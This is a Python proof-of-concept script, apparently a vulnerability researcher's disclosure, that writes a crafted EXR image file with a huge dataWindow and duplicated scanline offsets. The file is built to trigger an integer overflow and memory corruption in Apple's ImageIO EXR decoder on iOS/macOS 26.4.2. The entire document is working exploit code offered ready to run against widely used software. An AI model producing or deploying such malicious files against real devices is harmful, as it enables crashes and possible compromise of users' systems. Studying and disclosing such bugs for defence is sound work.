#!/usr/bin/env python3
"""
Generates a crafted EXR file capable of triggering
an integer overflow and subsequent memory corruption
on iOS/macOS 26.4.2

ImageIO vulnerability in function EXRReadPlugin::decodeBlockAppleEXR

@bellis1000
https://zygosec.com
"""

import struct
import numpy as np
import sys

# EXR magic number
EXR_MAGIC = 0x01312F76

def write_string(data, s):
    """Write a null-terminated string."""
    data.extend(s.encode() if isinstance(s, str) else s)
    data.extend(b'\x00')

def write_attr(data, name, type_name, value_bytes):
    """Write an EXR attribute: name, type, size, value."""
    write_string(data, name)
    write_string(data, type_name)
    data.extend(struct.pack('<I', len(value_bytes)))
    data.extend(value_bytes)


def write_box2i(xmin, ymin, xmax, ymax):
    """Pack a Box2i (4 x int32)."""
    return struct.pack('<iiii', xmin, ymin, xmax, ymax)


def write_v2f(x, y):
    """Pack a V2f (2 x float32)."""
    return struct.pack('<ff', x, y)


def write_chlist(channels):
    """
    Pack a channel list.
    Each channel: name (string), pixel_type (int32), 
    pLinear (uint8), reserved (3 bytes), xSampling (int32), ySampling (int32)
    Terminated by a null byte.
    """
    data = bytearray()
    for name, pixel_type in channels:
        write_string(data, name)
        data.extend(struct.pack('<I', pixel_type))  # pixel type
        data.extend(struct.pack('<B', 0))            # pLinear
        data.extend(b'\x00\x00\x00')                 # reserved
        data.extend(struct.pack('<ii', 1, 1))         # xSampling, ySampling
    data.extend(b'\x00')  # null terminator for channel list
    return bytes(data)

def write_chlist_extended(channels):
    """
    Pack a channel list with per-channel pixel type and sampling.
    channels: list of (name, pixel_type, xSampling, ySampling)
    """
    data = bytearray()
    for name, pixel_type, x_sampling, y_sampling in channels:
        write_string(data, name)
        data.extend(struct.pack('<I', pixel_type))
        data.extend(struct.pack('<B', 0))           # pLinear
        data.extend(b'\x00\x00\x00')                # reserved
        data.extend(struct.pack('<ii', x_sampling, y_sampling))
    data.extend(b'\x00')
    return bytes(data)

def generate_exr_overflow_trigger(filename, width, height):
    num_channels = 4

    header = bytearray()
    header.extend(struct.pack('<I', EXR_MAGIC))
    header.extend(struct.pack('<I', 2))

    chlist = write_chlist_extended([
        ("A", 2, 1, 1),
        ("B", 2, 1, 1),
        ("G", 2, 1, 1),
        ("R", 2, 1, 1),
    ])
    write_attr(header, "channels", "chlist", chlist)
    write_attr(header, "compression", "compression",
               struct.pack('<B', 0))

    # these are the values used in the buggy size calculation
    write_attr(header, "dataWindow", "box2i",
               write_box2i(0, 0, width - 1, height - 1))

    # these ones aren't used in that calculation, so they can remain small
    write_attr(header, "displayWindow", "box2i",
               write_box2i(0, 0, 100 - 1, 100 - 1))
    
    # standard stuff that needs to be present in EXR files
    write_attr(header, "lineOrder", "lineOrder",
               struct.pack('<B', 0))
    write_attr(header, "pixelAspectRatio", "float",
               struct.pack('<f', 1.0))
    write_attr(header, "screenWindowCenter", "v2f",
               write_v2f(0.0, 0.0))
    write_attr(header, "screenWindowWidth", "float",
               struct.pack('<f', 1.0))
    header.extend(b'\x00')

    scanline_size = width * num_channels * 4  # one scanline
    
    offsets = bytearray()
    pixel_data_start = len(header) + height * 8
    for y in range(height):
        # All scanlines point to the same data
        offsets.extend(struct.pack('<Q', pixel_data_start))
    
    # one legit scanline
    pixel_data = bytearray()
    pixel_data.extend(struct.pack('<i', 0))            # y = 0
    pixel_data.extend(struct.pack('<I', scanline_size)) # data size
    pixel_data.extend(b'\x41' * scanline_size)  # fill pixel data with 0x41414141

    with open(filename, 'wb') as f:
        f.write(header)
        f.write(offsets)
        f.write(pixel_data)

    print("[+] done")

if __name__ == "__main__":
    generate_exr_overflow_trigger("zygosec_poc.exr", 16384, 65536)
